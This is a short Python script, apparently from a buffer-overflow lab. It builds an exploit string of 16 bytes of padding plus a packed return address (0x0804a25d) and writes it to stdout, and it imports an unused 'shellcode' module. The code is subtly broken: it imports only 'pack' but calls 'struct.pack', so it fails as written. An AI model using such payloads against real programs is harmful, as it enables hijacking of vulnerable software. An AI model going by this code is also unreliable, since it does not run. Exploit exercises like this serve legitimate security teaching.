import sys
from struct import pack
from shellcode import shellcode

address = struct.pack('<I', 0x0804a25d)

exploit_string = b'                ' + address

sys.stdout.buffer.write(exploit_string)
